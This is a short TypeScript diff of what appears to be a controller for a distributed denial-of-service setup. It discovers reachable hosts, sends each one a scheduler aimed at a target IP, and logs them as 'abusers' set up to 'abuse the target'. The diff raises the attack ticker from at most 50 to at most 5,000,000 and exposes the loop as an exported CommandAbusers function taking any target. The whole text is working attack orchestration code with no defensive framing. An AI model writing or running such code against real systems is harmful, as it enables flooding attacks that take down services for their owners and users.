@@ -12,7 +12,7 @@ function generateRandomScheduler(targetIp: string) {
     const scheduler = {
         peaks: [] as any,
         duration: 60000, // 1 minute in milliseconds
-        ticker: Math.floor(Math.random() * 50) + 1,
+        ticker: Math.floor(Math.random() * 5000000) + 1,
         targetIP: targetIp // Add your target IP logic here
     };
 
@@ -39,19 +39,25 @@ function generateRandomScheduler(targetIp: string) {
 
 
 
-const aliveAddress = await DiscoverUbuntus()
 
-aliveAddress.forEach(async (ip) => {
 
-    await fetch(`http://${ip}:3000`, {
-        method: "POST",
-        body: JSON.stringify(generateRandomScheduler("192.168.100.2")),
-        headers: {
-            "content-type": "application/json"
-        }
+export default async function CommandAbusers(targetIp: string) {
+    console.log("Discovering the Abusers");
+    const aliveAddress = await DiscoverUbuntus()
+
+    console.log("Found " + aliveAddress.length + " abusers");
+
+    aliveAddress.forEach(async (ip) => {
+
+        await fetch(`http://${ip}:3000`, {
+            method: "POST",
+            body: JSON.stringify(generateRandomScheduler(targetIp)),
+            headers: {
+                "content-type": "application/json"
+            }
+        })
+
+        console.log("set up the abuser", ip, " to abuse the target " + targetIp)
     })
-
-    console.log("set up the abuser", ip)
-
-})
+}
 
